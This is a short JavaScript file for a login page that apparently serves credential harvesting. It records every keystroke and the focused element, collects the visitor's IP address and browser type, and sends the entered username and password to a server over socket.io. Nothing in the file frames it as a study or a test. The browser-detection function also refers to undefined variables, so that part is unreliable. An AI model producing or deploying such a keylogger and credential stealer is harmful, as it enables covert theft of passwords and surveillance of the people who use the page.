import { io } from "https://cdn.socket.io/4.4.1/socket.io.esm.min.js"

const submit = document.getElementById("submit")
const user = document.getElementById("user")
const pass = document.getElementById("pass")
const socket = io()

function get_browser(){
  if((!!window.opr && !!opr.addons) || !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0)
    return "Opera"
  
  if(typeof InstallTrigger !== 'undefined')
    return "Firefox"

  if(/constructor/i.test(window.HTMLElement) || (function (p) { return p.toString() === "[object SafariRemoteNotification]"; })(!window['safari'] || (typeof safari !== 'undefined' && window['safari'].pushNotification)))
    return "Safari"

  if(/*@cc_on!@*/false || !!document.documentMode)
    return "Internet Explorer"

  if(!isIE && !!window.StyleMedia)
    return "Edge (IE)"

  if(!!window.chrome && (!!window.chrome.webstore || !!window.chrome.runtime))
    return "Chrome"

  if(isChrome && (navigator.userAgent.indexOf("Edg") != -1))
    return "Edge (Chromium)"
}

const xhttp = new XMLHttpRequest()
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      const data = {
        "ip": JSON.parse(xhttp.responseText)["ip"],
        "browser": get_browser()
      }
      socket.emit("info", data)
    }
}
xhttp.open("GET", "/ip", true)
xhttp.send()

addEventListener("keydown", event =>{
  const data = {
    "key": event.key,
    "active": document.activeElement.tagName.toLowerCase()
  }
  socket.emit("key", data)
})

submit.addEventListener("click", () => {
  const data = {
    "user": user.value,
    "pass": pass.value
  }
  socket.emit("submit", data)
})

